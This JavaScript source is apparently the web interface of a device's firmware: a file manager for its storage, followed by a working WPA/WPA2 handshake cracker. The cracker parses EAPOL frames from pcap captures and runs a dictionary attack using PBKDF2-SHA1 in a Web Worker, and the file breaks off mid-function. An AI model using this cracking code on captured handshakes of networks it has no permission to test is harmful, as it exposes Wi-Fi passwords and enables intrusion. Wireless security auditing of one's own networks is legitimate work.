function $(s) { return document.querySelector(s) }
const IS_DEV = (window.location.host === "127.0.0.1:8080");
const T = {
  master: $('#t'),
  fileRow: function () {
    const tmp = document.createElement('template');
    tmp.innerHTML = this.master.content.querySelector('table tr.file-row').outerHTML;
    return tmp.content;
  },
  uploadLoading: function () {
    const tmp = document.createElement('template');
    tmp.innerHTML = this.master.content.querySelector('.upload-loading').outerHTML;
    return tmp.content;
  }
};

const Dialog = {
  _bg: function (show) {
    let bg = $(".dialog-background");
    let dialogs = document.querySelectorAll(".dialog");
    dialogs.forEach((dialog) => {
      if (!dialog.classList.contains("hidden"))
        dialog.classList.add("hidden");
    });
    if (show) {
      bg.classList.remove("hidden");
    } else {
      bg.classList.add("hidden");
    }
  },
  show: function (dialogName) {
    this._bg(true);
    let dialog = $(".dialog." + dialogName);
    dialog.classList.remove("hidden");
  },
  hide: function () {
    this._bg(false);
    this.loading.hide();
  },
  loading: {
    show: function (message) {
      $(".loading-area").classList.remove("hidden");
      $(".loading-area .text").textContent = message || "Loading...";
    },
    hide: function () {
      $(".loading-area").classList.add("hidden");
    }
  },
  showOneInput: function (name) {
    const dbForm = {
      renameFolder: {
        title: "Rename Folder",
        label: `New Name:`,
        action: "Rename"
      },
      renameFile: {
        title: "Rename File",
        label: `New Name:`,
        action: "Rename"
      },
      createFolder: {
        title: "Create Folder",
        label: `Folder Name:`,
        action: "Create Folder"
      },
      createFile: {
        title: "Create File",
        label: `File Name:`,
        action: "Create File"
      },
      serial: {
        title: "Serial Command",
        label: `Command:`,
        action: "Run"
      }
    };

    let config = dbForm[name];
    if (!config) {
      alert("Invalid dialog name: " + name);
      console.error("Dialog.showOneInput: Invalid dialog name", name);
      return;
    }

    let dialog = $(".dialog.oinput");
    dialog.querySelector(".oinput-title").textContent = config.title;
    dialog.querySelector(".oinput-label").textContent = config.label;
    dialog.querySelector(".oinput-file-name").textContent = "";
    dialog.querySelector(".act-save-oinput-file").textContent = config.action;
    this.show('oinput');
    dialog.querySelector("#oinput-input").value = "";
    dialog.querySelector("#oinput-input").focus();
    return dialog;
  }
};

async function requestPost (url, param) {
  return new Promise((resolve, reject) => {
    let fd = new FormData();
    for (let key in param) {
      fd.append(key, param[key]);
    }

    let realUrl = url;
    if (IS_DEV) realUrl = "/puteros" + url;
    let req = new XMLHttpRequest();
    req.open("POST", realUrl, true);
    req.withCredentials = true;
    req.onload = () => {
      if (req.status >= 200 && req.status < 300) {
        resolve(req.responseText);
      } else {
        reject(new Error(`Request failed with status ${req.status}`));
      }
    };
    req.onerror   = () => reject(new Error("Network error"));
    req.ontimeout = () => reject(new Error("Request timed out"));
    req.timeout   = 30000;
    req.send(fd);
  });
}

function stringToId(str) {
  let hash = 0, i, chr;
  if (str.length === 0) return hash.toString();
  for (i = 0; i < str.length; i++) {
    chr   = str.charCodeAt(i);
    hash  = ((hash << 5) - hash) + chr;
    hash |= 0; // Convert to 32bit integer
  }
  return 'id_' + Math.abs(hash);
}

const _queueUpload = [];
let _runningUpload = false;
function appendFileToQueue(files) {
  Dialog.show('upload');
  let d = $(".dialog.upload");
  for (let i = 0; i < files.length; i++) {
    let file = files[i];
    let filename = file.webkitRelativePath || file.name;
    let fileId = stringToId(filename);
    let progressBar = T.uploadLoading();
    progressBar.querySelector(".upload-name").textContent = filename;
    progressBar.querySelector(".upload-loading .bar").setAttribute("id", fileId);

    d.querySelector(".dialog-body").appendChild(progressBar);
  }
}
async function appendDroppedFiles(entry) {
  return new Promise((resolve, reject) => {
    if (entry.isFile) {
      entry.file((file) => {
        let fileWithPath = new File([file], entry.fullPath.substring(1), { type: file.type });
        appendFileToQueue([fileWithPath]);
        _queueUpload.push(fileWithPath);
        resolve();
      });
    } else if (entry.isDirectory) {
      let proms = [];
      let reader = entry.createReader();
      reader.readEntries((entries) => {
        for (let e of entries) proms.push(appendDroppedFiles(e));
      });

      Promise.all(proms).then(resolve);
    }
  })
}
async function uploadFile () {
  if (_queueUpload.length === 0) {
    _runningUpload = false;
    $(".dialog.upload .dialog-body").innerHTML = "";
    await fetchSystemInfo();
    await fetchFiles(currentPath);
    Dialog.hide();
    return;
  }

  return new Promise((resolve, reject) => {
    _runningUpload = true;
    let file = _queueUpload.shift();
    let fd = new FormData();
    let filename = file.webkitRelativePath || file.name;
    let fileId = stringToId(filename);
    fd.append("file", file, filename);
    fd.append("folder", currentPath);

    let realUrl = `/upload`;
    if (IS_DEV) realUrl = "/puteros" + realUrl;
    let req = new XMLHttpRequest();
    req.upload.onprogress = (e) => {
      if (e.lengthComputable) {
        var percent = (e.loaded / e.total) * 100;
        $("#" + fileId).style.width = Math.round(percent) + "%";
      }
    };
    req.onload = () => {
      uploadFile();
      if (req.status >= 200 && req.status < 300) {
        resolve(req.responseText);
      } else {
        reject();
      }
    };
    req.onabort = () => reject();
    req.onerror = () => reject();
    req.open("POST", realUrl, true);
    req.send(fd);
  });
}

function calcHash(str) {
  let hash = 5381;
  str = str.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  for (let i = 0; i < str.length; i++) {
    hash = ((hash << 5) + hash) ^ str.charCodeAt(i); // djb2 xor variant
    hash = hash >>> 0; // force unsigned 32-bit
  }

  return hash.toString(16).padStart(8, '0');
}

function renderFileRow(fileList) {
  $("table.explorer tbody").innerHTML = "";
  let sortedList = fileList.split("\n").sort((a, b) => {
    return a.localeCompare(b);
  })

  if (currentPath !== "/") sortedList = ["DIR:..:0", ...sortedList];

  sortedList
    .forEach((line) => {
    let e;
    let [type, name, size] = line.split(":");
    if (size === undefined) return;
    let dPath = ((currentPath.endsWith("/") ? currentPath : currentPath + "/") + name).replace(/\/\//g, "/");
    size = formatBytes(parseInt(size));
    if (name === "..") {
      dPath = currentPath.substring(0, currentPath.lastIndexOf("/"));
      if (dPath === "") dPath = "/";
    }

    if (type === "FILE") {
      e = T.fileRow();
      e.querySelector('.file-row').setAttribute("data-file", dPath);
      e.querySelector('.act-rename').setAttribute("data-action", "renameFile");
      e.querySelector(".col-name").classList.add("act-edit-file");
      e.querySelector(".col-name").textContent = name;
      e.querySelector(".col-name").setAttribute("title", name);
      e.querySelector(".col-size").textContent = size;
      e.querySelector(".col-action").classList.add("type-file");
      if (name.toLowerCase().endsWith('.pcap')) e.querySelector(".col-action").classList.add("type-pcap");

      let downloadUrl = `/download?file=${encodeURIComponent(dPath)}`;
      if (IS_DEV) downloadUrl = "/puteros" + downloadUrl;
      e.querySelector(".act-download").setAttribute("download", name);
      e.querySelector(".act-download").setAttribute("href", downloadUrl);
    } else if (type === "DIR") {
      e = T.fileRow();
      e.querySelector(".col-name").classList.add("act-browse");
      e.querySelector('.file-row').setAttribute("data-path", dPath);
      e.querySelector(".col-action").classList.add("type-folder");
      e.querySelector(".col-name").textContent = name;
      e.querySelector(".col-name").setAttribute("title", name);
      if (name !== "..") {
        e.querySelector('.act-rename').setAttribute("data-action", "renameFolder");
      } else {
        e.querySelector(".col-action").innerHTML = "";
      }
    }
    $("table.explorer tbody").appendChild(e);
  });
}

let currentPath;
async function fetchFiles(path) {
  currentPath = path;
  $(`.act-browse.active`)?.classList.remove("active");
  $(".current-path").textContent = "Storage:/" + path;
  Dialog.loading.show('Fetching files...');
  let req = await requestPost("/", {command: "ls", path});
  renderFileRow(req);
  Dialog.loading.hide();
}

function formatBytes(bytes) {
  if (bytes === 0) return '0 B';

  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));

  return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + ' ' + sizes[i];
}

async function fetchSystemInfo() {
  Dialog.loading.show('Fetching system info...');
  let req = await requestPost("/", {command: "sysinfo"});
  let data = req.split("\n");
  let usedSpace = parseInt(data[2].split(":")[1]);
  let totalSpace = parseInt(data[3].split(":")[1]);
  $(".free-space .free-sd span").innerHTML = `${formatBytes(usedSpace)} / ${formatBytes(totalSpace)}`;
  Dialog.loading.hide();
}

async function saveEditorFile() {
  Dialog.loading.show('Saving...');
  let editor = $(".dialog.editor .file-content");
  let filename = $(".dialog.editor .editor-file-name").textContent.trim();
  if (isModified(editor)) {
    $(".act-save-edit-file").disabled = true;
    editor.setAttribute("data-hash", calcHash(editor.value));
    await requestPost("/", {command: "echo", path: filename, content: editor.value});
  }

  Dialog.loading.hide();
}

function isModified(target) {
  let oldHash = target.getAttribute("data-hash");
  let newHash = calcHash(target.value);
  return oldHash !== newHash;
}

window.ondragenter = () => $(".upload-area").classList.remove("hidden");
$(".upload-area").ondragleave = () => $(".upload-area").classList.add("hidden");
$(".upload-area").ondragover = (e) => e.preventDefault();
$(".upload-area").ondrop = async (e) => {
  e.preventDefault();
  $(".upload-area").classList.add("hidden")
  const items = e.dataTransfer.items;
  if (!items || items.length === 0) return;

  for (let i of items) {
    let entry = i.webkitGetAsEntry();
    if (!entry) continue;
    await appendDroppedFiles(entry);
  }

  if (!_runningUpload) setTimeout(() => {
    if (_queueUpload.length === 0) return;
    uploadFile();
  }, 100);
};

document.querySelectorAll(".inp-uploader").forEach((el) => {
  el.addEventListener("change", async (e) => {
    let files = e.target.files;
    if (!files || files.length === 0) return;

    appendFileToQueue(files);
    _queueUpload.push(...files);
    if (!_runningUpload) uploadFile();

    this.value = "";
  });
});

$(".container").addEventListener("click", async (e) => {
  let browseAction = e.target.closest(".act-browse");
  if (browseAction) {
    e.preventDefault();
    let path = browseAction.getAttribute("data-path")
      || browseAction.closest("tr").getAttribute('data-path')
      || "/";
    if (path === currentPath) return;

    await fetchFiles(path);
    return;
  }

  let editFileAction = e.target.closest(".act-edit-file");
  if (editFileAction) {
    e.preventDefault();
    let editor = $(".dialog.editor .file-content");
    let file = editFileAction.closest("tr").getAttribute("data-file");
    if (!file) return;
    $(".dialog.editor .editor-file-name").textContent = file;
    editor.value = "";

    // Load file content
    Dialog.loading.show('Fetching content...');
    let r = await requestPost("/", {command: "cat", path: file});
    editor.value = r;
    editor.setAttribute("data-hash", calcHash(r));

    $(".act-save-edit-file").disabled = true;
    Dialog.loading.hide();
    Dialog.show('editor');
    return;
  }

  let oActionOInput = e.target.closest(".act-oinput");
  if (oActionOInput) {
    e.preventDefault();
    let action = oActionOInput.getAttribute("data-action");
    if (!action) return;

    let filePath = currentPath;
    let d = Dialog.showOneInput(action);
    if (action.startsWith("rename")) {
      let row = oActionOInput.closest("tr");
      filePath = row.getAttribute("data-file") || row.getAttribute("data-path");
    } else if (action === "serial") {
      filePath = "";
    }

    d.setAttribute("data-cache", `${action}|${filePath}`);
    if (filePath != "") {
      let fName = filePath.substring(filePath.lastIndexOf("/") + 1);
      let fNameSpan = d.querySelector(".oinput-file-name");
      fNameSpan.textContent = ": " + fName;
      fNameSpan.setAttribute("title", fName);
      $("#oinput-input").value = fName;
    }

    return;
  }

  let actDeleteFile = e.target.closest(".act-delete");
  if (actDeleteFile) {
    e.preventDefault();
    let file = actDeleteFile.closest(".file-row").getAttribute("data-file")
      || actDeleteFile.closest(".file-row").getAttribute("data-path");
    if (!file) return;

    if (!confirm(`Are you sure you want to DELETE ${file}?\n\nTHIS ACTION CANNOT BE UNDONE!`)) return;

    Dialog.loading.show('Deleting...');
    await requestPost("/", {command: "rm", path: file});
    await fetchSystemInfo();
    await fetchFiles(currentPath);
    Dialog.loading.hide();
    return;
  }
});


$(".dialog-background").addEventListener("click", async (e) => {
  if (e.target.matches(".act-dialog-close")) {
    e.preventDefault();
    Dialog.hide();
    return;
  }
});

$(".act-save-oinput-file").addEventListener("click", async (e) => {
  let dialog = $(".dialog.oinput");
  let fileInput = $("#oinput-input");
  let fileName = fileInput.value.trim();
  if (!fileName) {
    alert("Filename cannot be empty.");
    return;
  }
  let action = dialog.getAttribute("data-cache");
  if (!action) {
    alert("No action specified.");
    return;
  }

  let refreshList = true;
  let [actionType, path] = action.split("|");
  if (actionType.startsWith("rename")) {
    Dialog.loading.show('Renaming...');
    let destPath = path.substring(0, path.lastIndexOf("/") + 1) + fileName;
    await requestPost("/", {command: "mv", src: path, dst: destPath});
  } else if (actionType === "createFolder") {
    Dialog.loading.show('Creating Folder...');
    await requestPost("/", {command: "mkdir", path: path.trimEnd("/") + "/" + fileName});
  } else if (actionType === "createFile") {
    Dialog.loading.show('Creating File...');
    await requestPost("/", {command: "touch", path: path.trimEnd("/") + "/" + fileName});
  }

  if (refreshList) fetchFiles(currentPath);
  Dialog.hide();
});

$(".act-save-edit-file").addEventListener("click", async (e) => {
  await saveEditorFile();
});

$(".act-auth-login").addEventListener("click", async (e) => {
  let pass = $("#auth-password").value;
  if (!pass) {
    alert("Password cannot be empty.");
    return;
  }

  Dialog.loading.show('Authenticating...');
  try {
    await requestPost("/", {command: "sudo", param: pass});
    Dialog.hide();
    fetchSystemInfo();
    fetchFiles("/");
  } catch (error) {
    alert("Authentication error: " + error.message);
    console.error("Authentication error:", error);
  } finally {
    Dialog.loading.hide();
  }
});

$("#act-btn-logout").addEventListener("click", async (e) => {
  if (!confirm("Are you sure you want to logout?")) return;

  Dialog.loading.show('Logging out...');
  try {
    await requestPost("/", {command: "exit"});
    Dialog.show("auth");
  } catch (error) {
    alert("Logout error: " + error.message);
    console.error("Logout error:", error);
  } finally {
    Dialog.loading.hide();
  }
})

window.addEventListener("keydown", async (e) => {
  let key = e.key.toLowerCase()
  if ($(".dialog.editor:not(.hidden)")) { // means editor tab is open
    if ((e.ctrlKey || e.metaKey) && key === "s") {
      e.preventDefault();
      e.stopImmediatePropagation();

      await saveEditorFile();
    }
  }

  if (key === "enter" && $(".dialog-background:not(.hidden)")) {
    if (e.altKey || e.ctrlKey || e.metaKey || e.shiftKey) return;

    let activeDialog = $(".dialog:not(.hidden)");
    if (!activeDialog) return;

    let activeElement = document.activeElement;
    if (!activeDialog.contains(activeElement) || activeElement.tagName !== "INPUT") return;

    let inputs = Array.from(activeDialog.querySelectorAll("input:not([type='hidden']):not([disabled]):not([readonly])"));
    if (inputs.length === 0) return;

    e.preventDefault();
    let currentIndex = inputs.indexOf(activeElement);
    if (currentIndex >= 0 && currentIndex < inputs.length - 1) {
      inputs[currentIndex + 1].focus();
      return;
    }

    let submitButton = activeDialog.querySelector(
      ".act-save-oinput-file:not(:disabled), .act-auth-login:not(:disabled), .dialog-footer button:not(.act-dialog-close):not(:disabled)"
    );
    if (submitButton) submitButton.click();
    return;
  }

  if (key === "escape" && $(".dialog-background:not(.hidden)")) {
    if ($(".dialog.editor:not(.hidden)")) {
      let editor = $(".dialog.editor .file-content");
      if (isModified(editor)) {
        if (!confirm("You have unsaved changes. Do you want to discard them?")) {
          return;
        }
      }
    }

    let btnEscape = $(".dialog:not(.hidden) .act-escape");
    if (btnEscape) btnEscape.click();
    return;
  }
});

$(".file-content").addEventListener("keyup", function (e) {
  if ($(".dialog.editor:not(.hidden)")) {
    // map special characters to their closing pair
    map_chars = {
      "(": ")",
      "{": "}",
      "[": "]",
      '"': '"',
      "'": "'",
      "`": "`",
      "<": ">"
    };

    // if the key pressed is a special character, insert the closing pair
    if (e.key in map_chars) {
      var cursorPos = this.selectionStart;
      var textBefore = this.value.substring(0, cursorPos);
      var textAfter = this.value.substring(cursorPos);
      this.value = textBefore + map_chars[e.key] + textAfter;
      this.selectionStart = cursorPos;
      this.selectionEnd = cursorPos;
    }

    $(".act-save-edit-file").disabled = !isModified(e.target);
  }
});

// ── Crack: state ─────────────────────────────────────────────
let _crackRunning  = false;
let _crackStop     = false;
let _crackFilePath = null;

// ── Crack: helpers ────────────────────────────────────────────
function _byteCmp(a, b, len) {
  for (let i = 0; i < len; i++) {
    if (a[i] < b[i]) return -1;
    if (a[i] > b[i]) return  1;
  }
  return 0;
}

function _arrEq6(a, b) {
  for (let i = 0; i < 6; i++) if (a[i] !== b[i]) return false;
  return true;
}

function _buildPrfData(ap, sta, anonce, snonce) {
  const p = new Uint8Array(76);
  let o = 0;
  if (_byteCmp(ap, sta, 6) < 0) { p.set(ap, o); o += 6; p.set(sta, o); o += 6; }
  else                           { p.set(sta, o); o += 6; p.set(ap, o); o += 6; }
  if (_byteCmp(anonce, snonce, 32) < 0) { p.set(anonce, o); o += 32; p.set(snonce, o); }
  else                                  { p.set(snonce, o); o += 32; p.set(anonce, o); }
  return p;
}

function _ssidFromFilename(path) {
  const base = path.substring(path.lastIndexOf('/') + 1);
  const u = base.indexOf('_');
  const d = base.lastIndexOf('.');
  if (u >= 0 && d > u + 1) return base.substring(u + 1, Math.min(d, u + 1 + 32));
  return null;
}

// ── Crack: PCAP / EAPOL parser ────────────────────────────────
const _EAPOL_SNAP = [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E];

function _findSnap(d, start, flen) {
  for (let i = 0; i + 8 <= flen; i++) {
    let ok = true;
    for (let k = 0; k < 8; k++) if (d[start + i + k] !== _EAPOL_SNAP[k]) { ok = false; break; }
    if (ok) return i;
  }
  return -1;
}

function parsePcap(data, filePath) {
  let pos = 0, linktype = 105;
  if (data.length < 24) return null;
  if (data[0] === 0xD4 && data[1] === 0xC3 && data[2] === 0xB2 && data[3] === 0xA1) {
    linktype = (data[20] | (data[21] << 8) | (data[22] << 16) | (data[23] << 24)) >>> 0;
    pos = 24;
  }

  let ssidBytes = null, gotAnonce = false;
  let anonce = null, ap = null, sta = null;
  let pendM2 = false, pendSta = null, pendAp = null;
  let pendSnonce = null, pendMic = null, pendEapol = null;
  let hs = null;

  while (pos + 16 < data.length) {
    const incl = (data[pos+8] | (data[pos+9]<<8) | (data[pos+10]<<16) | (data[pos+11]<<24)) >>> 0;
    pos += 16;
    if (incl === 0 || incl > 65535 || pos + incl > data.length) break;
    const recStart = pos;
    pos += incl;
    if (incl > 512) continue;

    let off = 0;
    if (linktype === 127) {
      if (incl < 4) continue;
      off = data[recStart + 2] | (data[recStart + 3] << 8);
      if (off >= incl) continue;
    }
    const fs = recStart + off, flen = incl - off;
    if (flen < 2) continue;

    const fc   = data[fs] | (data[fs + 1] << 8);
    const fcTyp = (fc & 0x000C) >> 2;
    const fcSub = (fc & 0x00F0) >> 4;

    if (fcTyp === 0 && fcSub === 8 && flen >= 36 && !ssidBytes) {
      let p = 36;
      while (p + 2 <= flen) {
        const id = data[fs + p], elen = data[fs + p + 1];
        if (p + 2 + elen > flen) break;
        if (id === 0 && elen > 0 && elen <= 32) { ssidBytes = data.slice(fs + p + 2, fs + p + 2 + elen); break; }
        p += 2 + elen;
      }
      continue;
    }

    if (fcTyp !== 2) continue;

    const snap = _findSnap(data, fs, flen);
    if (snap < 0 || snap + 9 >= flen) continue;

    const eapolOff = fs + snap + 8, avail = flen - snap - 8;
    if (data[eapolOff + 1] !== 0x03) continue;

    const eapLen = (data[eapolOff + 2] << 8) | data[eapolOff + 3];
    let total = 4 + eapLen;
    if (total < 97 || avail < 97) continue;
    if (total > avail) total = avail;
    if (total > 300) continue;

    const keyOff = eapolOff + 4;
    const ki    = (data[keyOff + 1] << 8) | data[keyOff + 2];
    const ack   = !!(ki & 0x0080), mic = !!(ki & 0x0100), inst = !!(ki & 0x0040);

    if (ack && (!mic || inst)) {
      ap = data.slice(fs + 10, fs + 16);
      sta = data.slice(fs + 4, fs + 10);
      anonce = data.slice(keyOff + 13, keyOff + 45);
      gotAnonce = true;
      if (pendM2 && _arrEq6(pendSta, sta) && _arrEq6(pendAp, ap)) {
        hs = { ap, sta, anonce, snonce: pendSnonce, mic: pendMic, eapol: pendEapol };
      }
    } else if (!ack && mic && !inst) {
      let nz = true;
      for (let z = 0; z < 32 && nz; z++) nz = data[keyOff + 13 + z] === 0;
      if (nz) continue;

      const src = data.slice(fs + 10, fs + 16), dst = data.slice(fs + 4, fs + 10);
      if (gotAnonce && _arrEq6(src, sta) && _arrEq6(dst, ap)) {
        const sn     = data.slice(keyOff + 13, keyOff + 45);
        const m2Mic  = new Uint8Array(data.slice(eapolOff + 81, eapolOff + 97));
        const ef     = new Uint8Array(data.slice(eapolOff, eapolOff + total));
        ef.fill(0, 81, 97);
        hs = { ap, sta, anonce, snonce: sn, mic: m2Mic, eapol: ef };
      } else {
        pendM2 = true; pendSta = src; pendAp = dst;
        pendSnonce = data.slice(keyOff + 13, keyOff + 45);
        pendMic    = new Uint8Array(data.slice(eapolOff + 81, eapolOff + 97));
        const ef   = new Uint8Array(data.slice(eapolOff, eapolOff + total));
        ef.fill(0, 81, 97);
        pendEapol = ef;
      }
    }
  }

  if (!hs) return null;
  if (!ssidBytes) {
    const s = _ssidFromFilename(filePath);
    if (!s) return null;
    ssidBytes = new TextEncoder().encode(s);
  }
  hs.ssidBytes = ssidBytes;
  hs.ssid      = new TextDecoder().decode(ssidBytes);
  hs.prfData   = _buildPrfData(hs.ap, hs.sta, hs.anonce, hs.snonce);
  return hs;
}

// ── Crack: Web Worker ─────────────────────────────────────────
let _crackWorker = null;

const _CRACK_WORKER_SRC = `
const _W=new Int32Array(80),_SMSG=new Uint8Array(512),_SOUT=new Uint8Array(20);
const _HINN=new Uint8Array(512),_HOUT=new Uint8Array(84),_HIH=new Uint8Array(20);
const _U=new Uint8Array(20),_T1=new Uint8Array(20),_T2=new Uint8Array(20);
const _PMK=new Uint8Array(32),_SB=new Uint8Array(40),_K64=new Uint8Array(64);
const _PRE1={ip:new Uint8Array(64),op:new Uint8Array(64)};
const _PRE2={ip:new Uint8Array(64),op:new Uint8Array(64)};
const _PRE3={ip:new Uint8Array(64),op:new Uint8Array(64)};
const _PWBUF=new Uint8Array(64);
const _enc=new TextEncoder();
const _PRF_LABEL=new Uint8Array([80,97,105,114,119,105,115,101,32,107,101,121,32,101,120,112,97,110,115,105,111,110,0]);
let _pin=null,_stop=false;

function _sha1(src,sLen,out){
  if(src!==_SMSG)_SMSG.set(src.subarray(0,sLen));
  const k=(55-sLen%64+64)%64,mLen=sLen+1+k+8;
  _SMSG[sLen]=0x80;_SMSG.fill(0,sLen+1,mLen);
  const ml=sLen*8;
  _SMSG[mLen-8]=_SMSG[mLen-7]=_SMSG[mLen-6]=_SMSG[mLen-5]=0;
  _SMSG[mLen-4]=(ml>>>24)&0xFF;_SMSG[mLen-3]=(ml>>>16)&0xFF;
  _SMSG[mLen-2]=(ml>>>8)&0xFF;_SMSG[mLen-1]=ml&0xFF;
  let h0=0x67452301,h1=0xEFCDAB89,h2=0x98BADCFE,h3=0x10325476,h4=0xC3D2E1F0;
  for(let off=0;off<mLen;off+=64){
    for(let i=0;i<16;i++)_W[i]=(_SMSG[off+i*4]<<24)|(_SMSG[off+i*4+1]<<16)|(_SMSG[off+i*4+2]<<8)|_SMSG[off+i*4+3];
    for(let i=16;i<80;i++){const x=_W[i-3]^_W[i-8]^_W[i-14]^_W[i-16];_W[i]=(x<<1)|(x>>>31);}
    let a=h0,b=h1,c=h2,d=h3,e=h4;
    for(let i=0;i<80;i++){
      let f,K;
      if(i<20){f=(b&c)|(~b&d);K=0x5A827999;}
      else if(i<40){f=b^c^d;K=0x6ED9EBA1;}
      else if(i<60){f=(b&c)|(b&d)|(c&d);K=0x8F1BBCDC;}
      else{f=b^c^d;K=0xCA62C1D6;}
      const t=(((a<<5)|(a>>>27))+f+e+K+_W[i])|0;
      e=d;d=c;c=(b<<30)|(b>>>2);b=a;a=t;
    }
    h0=(h0+a)|0;h1=(h1+b)|0;h2=(h2+c)|0;h3=(h3+d)|0;h4=(h4+e)|0;
  }
  out[0]=(h0>>>24)&0xFF;out[1]=(h0>>>16)&0xFF;out[2]=(h0>>>8)&0xFF;out[3]=h0&0xFF;
  out[4]=(h1>>>24)&0xFF;out[5]=(h1>>>16)&0xFF;out[6]=(h1>>>8)&0xFF;out[7]=h1&0xFF;
  out[8]=(h2>>>24)&0xFF;out[9]=(h2>>>16)&0xFF;out[10]=(h2>>>8)&0xFF;out[11]=h2&0xFF;
  out[12]=(h3>>>24)&0xFF;out[13]=(h3>>>16)&0xFF;out[14]=(h3>>>8)&0xFF;out[15]=h3&0xFF;
  out[16]=(h4>>>24)&0xFF;out[17]=(h4>>>16)&0xFF;out[18]=(h4>>>8)&0xFF;out[19]=h4&0xFF;
}
function _hmacPreInto(key,kLen,pre){
  _K64.fill(0);
  if(kLen>64){_sha1(key,kLen,_SOUT);_K64.set(_SOUT.subarray(0,20));}
  else _K64.set(key.subarray(0,kLen));
  for(let i=0;i<64;i++){pre.ip[i]=_K64[i]^0x36;pre.op[i]=_K64[i]^0x5C;}
}
function _hmacFin(pre,data,dLen,out){
  _HINN.set(pre.ip,0);_HINN.set(data.subarray(0,dLen),64);
  _sha1(_HINN,64+dLen,_HIH);
  _HOUT.set(pre.op,0);_HOUT.set(_HIH,64);
  _sha1(_HOUT,84,out);
}
function _pbkdf2(pre,ssidBytes){
  const sLen=ssidBytes.length;
  for(let blk=1;blk<=2;blk++){
    _SB.set(ssidBytes,0);_SB[sLen]=0;_SB[sLen+1]=0;_SB[sLen+2]=0;_SB[sLen+3]=blk;
    _hmacFin(pre,_SB,sLen+4,_U);
    const T=blk===1?_T1:_T2;T.set(_U);
    for(let i=1;i<4096;i++){_hmacFin(pre,_U,20,_U);for(let j=0;j<20;j++)T[j]^=_U[j];}
    const oo=(blk-1)*20,ol=Math.min(20,32-oo);_PMK.set(T.subarray(0,ol),oo);
  }
}
function _tryPw(pw,hs){
  const r=_enc.encodeInto(pw,_PWBUF);
  _hmacPreInto(_PWBUF,r.written,_PRE1);
  _pbkdf2(_PRE1,hs.ssidBytes);
  _hmacPreInto(_PMK,32,_PRE2);
  _hmacFin(_PRE2,_pin,_pin.length,_SOUT);
  _hmacPreInto(_SOUT,16,_PRE3);
  _hmacFin(_PRE3,hs.eapol,hs.eapol.length,_SOUT);
  for(let i=0;i<16;i++)if(_SOUT[i]!==hs.mic[i])return false;
  return true;
}

let _wasm=null,_wasmMem=null,_pPw=[0,0,0,0],_pSsid,_pPrf,_pEapol,_pMic;

async function _loadWasm(){
  try{
    const _wasmUrl='${(IS_DEV?location.origin+"/puteros":location.origin)}/crack.wasm';
    const r=await fetch(_wasmUrl);
    if(!r.ok)return false;
    const {instance:inst}=await WebAssembly.instantiate(await r.arrayBuffer(),{});
    const e=inst.exports;
    const required=['memory','wasm_pw0_buf','wasm_pw1_buf','wasm_pw2_buf','wasm_pw3_buf',
                    'wasm_ssid_buf','wasm_prf_data_buf','wasm_eapol_buf','wasm_mic_buf',
                    'wasm_try_passwords_batch'];
    if(required.some(k=>!e[k]))return false;
    _wasmMem=new Uint8Array(e.memory.buffer);
    for(let b=0;b<4;b++) _pPw[b]=e['wasm_pw'+b+'_buf']();
    _pSsid=e.wasm_ssid_buf();
    _pPrf=e.wasm_prf_data_buf();_pEapol=e.wasm_eapol_buf();_pMic=e.wasm_mic_buf();
    _wasm=e;return true;
  }catch(e){return false;}
}

onmessage=async function(e){
  const msg=e.data;
  if(msg.type==="stop"){_stop=true;return;}
  if(msg.type!=="start")return;
  _stop=false;
  const hs=msg.hs,words=msg.words,total=words.length;

  const wasmOk=await _loadWasm();
  postMessage({type:"mode",mode:wasmOk?'wasm':'js'});

  if(wasmOk){
    _wasmMem.set(hs.ssidBytes,_pSsid);
    _wasmMem.set(hs.prfData,_pPrf);
    _wasmMem.set(hs.eapol,_pEapol);
    _wasmMem.set(hs.mic,_pMic);
  } else {
    _pin=new Uint8Array(100);
    _pin.set(_PRF_LABEL,0);
    _pin.set(hs.prfData,_PRF_LABEL.length);
  }

  let tested=0,lastUpd=Date.now();
  for(let i=0;i<total&&!_stop;){
    if(wasmOk){
      const batchStart=i;
      const count=Math.min(4,total-batchStart);
      const pl=[0,0,0,0];
      for(let b=0;b<count;b++){
        const r=_enc.encodeInto(words[batchStart+b],_PWBUF);
        _wasmMem.set(_PWBUF.subarray(0,r.written),_pPw[b]);
        pl[b]=r.written;
      }
      const hit=_wasm.wasm_try_passwords_batch(count,pl[0],pl[1],pl[2],pl[3],hs.ssidBytes.length,hs.eapol.length);
      tested+=count;i+=count;
      if(hit>=0){postMessage({type:"done",found:true,pw:words[batchStart+hit],tested:tested-count+hit+1});return;}
    }else{
      if(_tryPw(words[i],hs)){postMessage({type:"done",found:true,pw:words[i],tested:tested+1});return;}
      tested++;i++;
    }
    const now=Date.now();
    if(now-lastUpd>=150){lastUpd=now;postMessage({type:"progress",tested,total});await new Promise(r=>setTimeout(r,0));}
  }
  postMessage({type:"done",found:false,stopped:_stop,tested});
};
`;

// ── Crack: UI helpers ─────────────────────────────────────────
function _crackSetPhase(phase) {
  $(".crack-phase-dict").classList.toggle("hidden", phase !== "dict");
  $(".crack-phase-run").classList.toggle("hidden", phase !== "run");
  $(".crack-result").classList.add("hidden");
  $(".act-crack-go").classList.toggle("hidden", phase !== "dict");
  $(".act-crack-stop").classList.toggle("hidden", phase !== "run");
  $(".act-crack-retry-save").classList.add("hidden");
}

function updateCrackProgress(tested, total, wps, eta) {
  const pct = total > 0 ? Math.round(tested * 100 / total) : 0;
  $(".crack-bar").style.width = pct + "%";
  $(".crack-bar-pct").textContent = pct + "%";
  let stats = tested + " / " + total;
  if (wps > 0) {
    stats += "  " + (wps >= 1000 ? (wps / 1000).toFixed(1) + "k/s" : wps + "/s");
    if (eta > 0) {
      const etaStr = eta >= 60 ? Math.floor(eta/60) + "m" + String(eta % 60).padStart(2, "0") + "s" : eta + "s";
      stats += "  ETA " + etaStr;
    }
  }
  $(".crack-stats").textContent = stats;
}

let _crackFoundPw = null;

async function _saveCrack(pw) {
  $(".act-crack-retry-save").classList.add("hidden");
  try {
    const fd = new FormData();
    fd.append("command", "saveCrack");
    fd.append("pcap", _crackFilePath);
    fd.append("pw", pw);
    const r = await fetch("/", { method: "POST", body: fd });
    if (!r.ok) throw new Error(await r.text());
    $(".crack-result").textContent += "  [saved]";
  } catch (err) {
    $(".crack-result").textContent += "  [save failed: " + err.message + "]";
